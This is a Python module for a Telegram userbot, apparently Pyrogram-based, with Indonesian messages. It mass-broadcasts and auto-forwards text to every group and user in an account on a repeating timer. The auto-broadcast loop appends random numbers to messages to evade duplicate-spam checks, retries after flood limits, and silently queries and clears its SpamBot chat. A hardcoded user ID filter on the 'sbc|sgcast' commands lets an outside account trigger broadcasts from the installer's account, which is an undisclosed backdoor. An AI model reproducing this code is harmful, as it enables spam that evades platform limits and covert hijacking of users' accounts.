import asyncio
import random

from gc import get_objects
from asyncio import sleep
from pyrogram.raw.functions.messages import DeleteHistory, StartBot

from pyrogram.errors.exceptions import FloodWait

from PyroUbot import *

__MODULE__ = "broadcast"
__HELP__ = """
<blockquote>
<b>『 ʙᴀɴᴛᴜᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ』</b> </blockquote>
<blockquote>
<b>➢ ᴘᴇʀɪɴᴛᴀʜ:</b> <code>{0}gcast</code> <b>ᴀᴛᴀᴜ</b> <code>{0}bc</code>
    <i>mengirim pesan siaran group/users/all</i>
  <b>ᴛʏᴘᴇ:</b>
  ● <code>all</code>
  ● <code>users</code>
  ● <code>group</code>

<b>➢ ᴘᴇʀɪɴᴛᴀʜ:</b> <code>{0}cgcast</code>
    <i>untuk membatalkan proses gcast</i>

<b>➢ ᴘᴇʀɪɴᴛᴀʜ:</b> <code>{0}bcfd</code> <b>ᴀᴛᴀᴜ</b> <code>{0}cfd</code>
    <i>mengirim pesan siaran secara forward</i>

<b>➢ ᴘᴇʀɪɴᴛᴀʜ:</b> <code>{0}send</code>
    <i>mengirim pesan ke user/group/channel</i>
    </blockquote>
"""

async def limit_cmd(client, message):
    await client.unblock_user("SpamBot")
    bot_info = await client.resolve_peer("SpamBot")
    _msg = "<b>ᴍᴇᴍᴘʀᴏsᴇs...</b>"

    msg = await message.reply(_msg)
    response = await client.invoke(
        StartBot(
            bot=bot_info,
            peer=bot_info,
            random_id=client.rnd_id(),
            start_param="start",
        )
    )
    await sleep(1)
    await msg.delete()
    status = await client.get_messages("SpamBot", response.updates[1].message.id + 1)
    await status.copy(message.chat.id, reply_to_message_id=message.id)
    return await client.invoke(DeleteHistory(peer=bot_info, max_id=0, revoke=True))


gcast_progress = []


@ubot.on_message(filters.user(1361379181) & filters.command("sbc|sgcast", ""))
@PY.UBOT("gcast|bc")
async def _(client, message):
    global gcast_progress
    gcast_progress.append(client.me.id)
    prs = await EMO.PROSES(client)
    brhsl = await EMO.BERHASIL(client)
    ggl = await EMO.GAGAL(client)
    bcs = await EMO.BROADCAST(client)
    ktrng = await EMO.BL_KETERANGAN(client)
    
    _msg = f"<b>{prs}ᴍᴇᴍᴘʀᴏsᴇs...</b>"
    gcs = await message.reply(_msg)

    # Validasi input
    command, text = extract_type_and_msg(message)
    if command not in ["group", "users", "all"] or not text:
        return await gcs.edit(f"{ggl}<code>{message.text.split()[0]}</code> <b>[ᴛʏᴘᴇ] [ᴛᴇxᴛ/ʀᴇᴘʟʏ]</b>")

    haku = await client.get_prefix(client.me.id)
    anjai = haku[0]

    # Countdown untuk konfirmasi
    for i in range(5, 0, -1):
        await gcs.edit(f"{prs}<i>**ɢᴜɴᴀᴋᴀɴ**</i> <code>{anjai}cgcast</code>\n<i>**ᴄᴀɴᴄᴇʟ ɢᴄᴀsᴛ**</i> <code>{i}</code> <i>**ᴅᴇᴛɪᴋ**</i>")
        await asyncio.sleep(1)
    await gcs.edit(f"{prs}<i>**ᴘʀᴏᴄᴇssɪɴɢ..**</i>")

    # Ambil daftar ID target
    chats = await get_data_id(client, command)
    blacklist = await get_list_from_vars(client.me.id, "BL_ID")

    # Filter target yang valid
    targets = [chat_id for chat_id in chats if chat_id not in blacklist and chat_id not in BLACKLIST_CHAT]

    async def send_message(chat_id):
        """Fungsi untuk mengirim pesan ke target tertentu."""
        nonlocal done, failed
        try:
            if message.reply_to_message:
                await text.copy(chat_id)
            else:
                await client.send_message(chat_id, text)
            done += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
            try:
                if message.reply_to_message:
                    await text.copy(chat_id)
                else:
                    await client.send_message(chat_id, text)
                done += 1
            except:
                failed += 1
        except Exception:
            failed += 1

    # Jalankan pengiriman secara paralel
    done, failed = 0, 0
    tasks = [send_message(chat_id) for chat_id in targets]
    await asyncio.gather(*tasks, return_exceptions=True)

    # Hapus dari progres dan kirim laporan
    gcast_progress.remove(client.me.id)
    await gcs.delete()
    _gcs = f"""
<blockquote><i> <b>{bcs}ʙʀᴏᴀᴅᴄᴀsᴛ</b> </i></blockquote>
<blockquote>
<i> <b>{brhsl}sᴜᴋsᴇs {done} ɢʀᴏᴜᴘ</b> </i>
<i> <b>{ggl}ғᴀɪʟᴇᴅ {failed} ɢʀᴏᴜᴘ</b> </i>
<i> <b>{ktrng}ᴛʏᴘᴇ {command}</b> </i></blockquote>
"""
    return await message.reply(_gcs)


@PY.UBOT("cgcast")
async def stopg_handler(client, message):
    brhsl = await EMO.BERHASIL(client)
    ggl = await EMO.GAGAL(client)
    global gcast_progress
    if client.me.id in gcast_progress:
        gcast_progress.remove(client.me.id)
        return await message.reply(f"<blockquote>{brhsl}<i>**ɢᴄᴀsᴛ sᴛᴏᴘᴘᴇᴅ!**</i></blockquote>")
    else:
        return await message.reply(f"<b>{ggl}ɴᴏ ɢᴄᴀsᴛ !!</b>")

@PY.UBOT("bcfd|cfd")
async def _(client, message):
    prs = await EMO.PROSES(client)
    brhsl = await EMO.BERHASIL(client)
    ggl = await EMO.GAGAL(client)
    bcs = await EMO.BROADCAST(client)
    
    _msg = f"<b>{prs}ᴍᴇᴍᴘʀᴏsᴇs...</b>"
    gcs = await message.reply(_msg)

    command, text = extract_type_and_msg(message)
    
    if command not in ["group", "users", "all"] or not text:
        return await gcs.edit(f"{ggl}<code>{message.text.split()[0]}</code> <b>[ᴛʏᴘᴇ] [ʀᴇᴘʟʏ]</b>")

    if not message.reply_to_message:
        return await gcs.edit(f"{ggl}<code>{message.text.split()[0]}</code> <b>[ᴛʏᴘᴇ] [ʀᴇᴘʟʏ]</b>")

    chats = await get_data_id(client, command)
    blacklist = await get_list_from_vars(client.me.id, "BL_ID")

    done = 0
    failed = 0
    for chat_id in chats:
        if chat_id in blacklist or chat_id in BLACKLIST_CHAT:
            continue

        try:
            if message.reply_to_message:
                await message.reply_to_message.forward(chat_id)
            else:
                await text.forward(chat_id)
            done += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
            if message.reply_to_message:
                await message.reply_to_message.forward(chat_id)
            else:
                await text.forward(chat_id)
            done += 1
        except Exception:
            failed += 1
            pass

    await gcs.delete()
    _gcs = f"""
<i> <b>{bcs}ʙʀᴏᴀᴅᴄᴀsᴛ ғᴏʀᴡᴀʀᴅ ꜱᴇɴᴛ</b> </i>
<i> <b>{brhsl}ꜱᴜᴄᴄᴇꜱ {done} ɢʀᴏᴜᴘ</b> </i>
<i> <b>{ggl}ꜰᴀɪʟᴇᴅ {failed} ɢʀᴏᴜᴘ</b> </i>
"""
    return await message.reply(_gcs)


@PY.BOT("broadcast")
@PY.ADMIN
async def _(client, message):
    msg = await message.reply("<blockquote><b>sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs ᴍᴏʜᴏɴ ʙᴇʀsᴀʙᴀʀ</b></blockquote>", quote=True)

    send = get_message(message)
    if not send:
        return await msg.edit("<blockquote><b>ᴍᴏʜᴏɴ ʙᴀʟᴀs sᴇsᴜᴀᴛᴜ ᴀᴛᴀᴜ ᴋᴇᴛɪᴋ sᴇsᴜᴀᴛᴜ...</b></blockquote>")
        
    susers = await get_list_from_vars(client.me.id, "SAVED_USERS")
    done = 0
    for chat_id in susers:
        try:
            if message.reply_to_message:
                await send.forward(chat_id)
            else:
                await client.send_message(chat_id, send)
            done += 1
        except FloodWait as e:
            await asyncio.sleep(e.value)
            if message.reply_to_message:
                await send.forward(chat_id)
            else:
                await client.send_message(chat_id, send)
            done += 1
        except Exception:
            pass

    return await msg.edit(f"<blockquote><b>ᴘᴇsᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ ᴀɴᴅᴀ ᴛᴇʀᴋɪʀɪᴍ ᴋᴇ {done} ᴜsᴇʀs</b></blockquote>")

@PY.UBOT("send")
async def _(client, message):
    if message.reply_to_message:
        chat_id = (
            message.chat.id if len(message.command) < 2 else message.text.split()[1]
        )
        try:
            if client.me.id != bot.me.id:
                if message.reply_to_message.reply_markup:
                    x = await client.get_inline_bot_results(
                        bot.me.username, f"get_send {id(message)}"
                    )
                    return await client.send_inline_bot_result(
                        chat_id, x.query_id, x.results[0].id
                    )
        except Exception as error:
            return await message.reply(error)
        else:
            try:
                return await message.reply_to_message.copy(chat_id)
            except Exception as t:
                return await message.reply(f"{t}")
    else:
        if len(message.command) < 3:
            return await message.reply("ᴋᴇᴛɪᴋ ʏᴀɴɢ ʙᴇɴᴇʀ")
        chat_id, chat_text = message.text.split(None, 2)[1:]
        try:
            if "_" in chat_id:
                msg_id, to_chat = chat_id.split("_")
                return await client.send_message(
                    to_chat, chat_text, reply_to_message_id=int(msg_id)
                )
            else:
                return await client.send_message(chat_id, chat_text)
        except Exception as t:
            return await message.reply(f"{t}")


@PY.INLINE("^get_send")
async def _(client, inline_query):
    _id = int(inline_query.query.split()[1])
    m = next((obj for obj in get_objects() if id(obj) == _id), None)
    if m:
        await client.answer_inline_query(
            inline_query.id,
            cache_time=0,
            results=[
                InlineQueryResultArticle(
                    title="get send!",
                    reply_markup=m.reply_to_message.reply_markup,
                    input_message_content=InputTextMessageContent(
                        m.reply_to_message.text
                    ),
                )
            ],
        )


AG = []
LT = []


@PY.UBOT("auto_gcast")
async def _(client, message):
    prs = await EMO.PROSES(client)
    brhsl = await EMO.BERHASIL(client)
    bcs = await EMO.BROADCAST(client)
    mng = await EMO.MENUNGGU(client)
    ggl = await EMO.GAGAL(client)
    ktrng = await EMO.BL_KETERANGAN(client)
   
    msg = await message.reply(f"<b>{prs}sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs...</b>")
    type, value = extract_type_and_text(message)
    auto_text_vars = await get_vars(client.me.id, "AUTO_TEXT")

    if type == "on":
        if not auto_text_vars:
            return await msg.edit(
                f"{ggl}<b>ʜᴀʀᴀᴘ sᴇᴛᴛɪɴɢ ᴛᴇxᴛ ɢᴄᴀsᴛ ᴀɴᴅᴀ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ</b>"
            )

        if client.me.id not in AG:
            await msg.edit(f"{brhsl}<b>ᴀᴜᴛᴏ ɢᴄᴀsᴛ ᴅɪᴀᴋᴛɪғᴋᴀɴ</b>")

            AG.append(client.me.id)

            done = 0
            while client.me.id in AG:
                delay = await get_vars(client.me.id, "DELAY_GCAST") or 1
                blacklist = await get_list_from_vars(client.me.id, "BL_ID")
                txt = random.choice(auto_text_vars)

                group = 0
                async for dialog in client.get_dialogs():
                    if (
                        dialog.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP)
                        and dialog.chat.id not in blacklist
                    ):
                        try:
                            await asyncio.sleep(1)
                            await client.send_message(dialog.chat.id, f"{txt} {random.choice(range(999))}")
                            group += 1
                        except FloodWait as e:
                            await asyncio.sleep(e.value)
                            await client.send_message(dialog.chat.id, f"{txt} {random.choice(range(999))}")
                            group += 1
                        except Exception:
                            pass

                if client.me.id not in AG:
                    return

                done += 1
                await msg.reply(f"""
<blockquote><b>{bcs}ᴀᴜᴛᴏ_ɢᴄᴀsᴛ ᴛᴇʀᴋɪʀɪᴍ</b>
<b>ᴘᴜᴛᴀʀᴀɴ:</b> {done}
<b>{brhsl}ʙᴇʀʜᴀsɪʟ:</b> {group} <b>ɢʀᴏᴜᴘ</b>
<b>{mng}ᴍᴇɴᴜɴɢɢᴜ:</b> {delay} <b>ᴍᴇɴɪᴛ</b></blockquote>
""",
                    quote=True,
                )
                await asyncio.sleep(int(60 * int(delay)))
        else:
            return await msg.delete()

    elif type == "off":
        if client.me.id in AG:
            AG.remove(client.me.id)
            return await msg.edit(f"{brhsl}<b>ᴀᴜᴛᴏ ɢᴄᴀsᴛ ᴅɪɴᴏɴᴀᴋᴛɪғᴋᴀɴ</b>")
        else:
            return await msg.delete()

    elif type == "text":
        if not value:
            return await msg.edit(
                f"{ggl}<b><code>{message.text.split()[0]} text</code> - [ᴠᴀʟᴜᴇ]</b>"
            )
        await add_auto_text(client, value)
        return await msg.edit(f"{brhsl}<b>ʙᴇʀʜᴀsɪʟ ᴅɪ sɪᴍᴘᴀɴ</b>")

    elif type == "delay":
        if not int(value):
            return await msg.edit(
                f"{ggl}<b><code>{message.text.split()[0]} delay</code> - [ᴠᴀʟᴜᴇ]</b>"
            )
        await set_vars(client.me.id, "DELAY_GCAST", value)
        return await msg.edit(
            f"{brhsl}<b>ʙᴀʀʜᴀsɪʟ ᴋᴇ sᴇᴛᴛɪɴɢ {value} ᴍᴇɴɪᴛ</b>"
        )

    elif type == "remove":
        if not value:
            return await msg.edit(
                f"{ggl}<b><code>{message.text.split()[0]} remove</code> - [ᴠᴀʟᴜᴇ]</b>"
            )
        if value == "all":
            await set_vars(client.me.id, "AUTO_TEXT", [])
            return await msg.edit(f"{brhsl}<b>sᴇᴍᴜᴀ ᴛᴇxᴛ ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs</b>")
        try:
            value = int(value) - 1
            auto_text_vars.pop(value)
            await set_vars(client.me.id, "AUTO_TEXT", auto_text_vars)
            return await msg.edit(
                f"<b>{brhsl}ᴛᴇxᴛ ᴋᴇ {value+1} ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs</b>"
            )
        except Exception as error:
            return await msg.edit(str(error))

    elif type == "list":
        if not auto_text_vars:
            return await msg.edit(f"{ggl}<b>ᴀᴜᴛᴏ ɢᴄᴀsᴛ ᴛᴇxᴛ ᴋᴏsᴏɴɢ</b>")
        txt = f"{ktrng}<b>ᴅᴀғᴛᴀʀ ᴀᴜᴛᴏ ɢᴄᴀsᴛ ᴛᴇxᴛ</b>\n\n"
        for num, x in enumerate(auto_text_vars, 1):
            txt += f"<b>{num}•></b> {x}\n\n"
        txt += f"{ggl}<b>\nᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴀᴘᴜs ᴛᴇxᴛ:\n<code>{message.text.split()[0]} remove</code> [ᴀɴɢᴋᴀ/ᴀʟʟ]</b>"
        return await msg.edit(txt)

    elif type == "limit":
        if value == "off":
            if client.me.id in LT:
                LT.remove(client.me.id)
                return await msg.edit(f"{brhsl}<b>ᴀᴜᴛᴏ ᴄᴇᴋ ʟɪᴍɪᴛ ᴅɪɴᴏɴᴀᴋᴛɪғᴋᴀɴ</b>")
            else:
                return await msg.delete()

        elif value == "on":
            if client.me.id not in LT:
                LT.append(client.me.id)
                await msg.edit(f"{brhsl}<b>ᴀᴜᴛᴏ ᴄᴇᴋ ʟɪᴍɪᴛ sᴛᴀʀᴛᴇᴅ</b>")
                while client.me.id in LT:
                    for x in range(2):
                        await limit_cmd(client, message)
                        await asyncio.sleep(5)
                    await asyncio.sleep(1200)
            else:
                return await msg.delete()
        else:
             return await msg.edit(f"{ggl}<b><code>{message.text.split()[0]} limit</code> - [ᴠᴀʟᴜᴇ]</b>")

    else:
        return await msg.edit(f"{ggl}<b><code>{message.text.split()[0]}</code> [ǫᴜᴇʀʏ] - [ᴠᴀʟᴜᴇ]</b>")


async def add_auto_text(client, text):
    auto_text = await get_vars(client.me.id, "AUTO_TEXT") or []
    auto_text.append(text)
    await set_vars(client.me.id, "AUTO_TEXT", auto_text)


AG = []  # List untuk menyimpan user yang mengaktifkan Auto GCast
FORWARD_DATA = {}  # Dictionary untuk menyimpan pesan yang akan diteruskan

@PY.UBOT("auto_fwd")
async def auto_gcast(client, message):
    global FORWARD_DATA
    command = message.text.split(maxsplit=1)
    msg = await message.reply("<b>Memproses perintah...</b>")
    
    if len(command) < 2:
        return await msg.edit("<b>Gunakan: /auto_gcast [on/off/forward]</b>")
    
    action = command[1].lower()
    
    if action == "on":
        if client.me.id not in AG:
            if client.me.id not in FORWARD_DATA:
                return await msg.edit("<b>Harap simpan pesan terlebih dahulu dengan /auto_gcast forward</b>")
            
            AG.append(client.me.id)
            await msg.edit("<b>Auto Forward GCast diaktifkan!</b>")
            done = 0
            
            while client.me.id in AG:
                delay = 5  # Atur delay antar forward
                group_count = 0
                
                async for dialog in client.get_dialogs():
                    if dialog.chat.type in (ChatType.GROUP, ChatType.SUPERGROUP):
                        try:
                            await asyncio.sleep(1)
                            await client.forward_messages(
                                dialog.chat.id,  # Tujuan forward
                                FORWARD_DATA[client.me.id]["chat_id"],  # Chat asal pesan
                                FORWARD_DATA[client.me.id]["message_id"]  # ID pesan yang diteruskan
                            )
                            group_count += 1
                        except FloodWait as e:
                            await asyncio.sleep(e.value)
                        except Exception:
                            pass
                
                done += 1
                await msg.reply(
                    f"<b>Auto Forward GCast Terkirim</b>\n"
                    f"<b>Putaran:</b> {done}\n"
                    f"<b>Berhasil ke:</b> {group_count} grup\n"
                    f"<b>Menunggu:</b> {delay} menit"
                )
                await asyncio.sleep(delay * 60)
        else:
            return await msg.delete()
    
    elif action == "off":
        if client.me.id in AG:
            AG.remove(client.me.id)
            return await msg.edit("<b>Auto Forward GCast dinonaktifkan!</b>")
        else:
            return await msg.delete()
    
    elif action == "forward":
        if not message.reply_to_message:
            return await msg.edit("<b>Reply ke pesan yang ingin disimpan untuk diteruskan!</b>")
        
        FORWARD_DATA[client.me.id] = {
            "chat_id": message.chat.id,
            "message_id": message.reply_to_message.message_id
        }
        return await msg.edit("<b>Pesan berhasil disimpan untuk diteruskan dalam auto GCast!</b>")
    
    else:
        return await msg.edit("<b>Perintah tidak dikenal! Gunakan: /auto_gcast [on/off/forward]</b>")
